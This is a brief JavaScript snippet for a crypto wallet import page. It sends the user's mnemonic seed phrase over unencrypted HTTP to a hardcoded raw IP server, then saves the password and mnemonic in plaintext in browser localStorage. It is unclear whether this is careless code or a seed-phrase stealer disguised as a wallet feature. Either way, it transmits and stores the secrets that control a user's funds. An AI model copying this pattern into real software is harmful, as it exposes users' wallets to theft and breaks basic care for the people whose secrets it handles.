document.getElementById('import-wallet-btn').addEventListener('click', async function importWallet() {
    const mnemonic = document.getElementById('mnemonic').value;
    if (!mnemonic) {
      alert('Please enter a mnemonic');
      return;
    }
  
    const response = await fetch('http://13.233.172.115:3000/import-wallet', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ mnemonic }),
    });
  
    const data = await response.json();
  
    if (data.error) {
      alert('Error: ' + data.error);
    } else {
      const password = localStorage.getItem('password');
      localStorage.setItem('walletData', JSON.stringify({
        password,
        mnemonic,
        address: data.address,
        balance: data.balance,
      }));
      window.location.href = 'profile.html'; // Redirect to profile page
    }
  });
  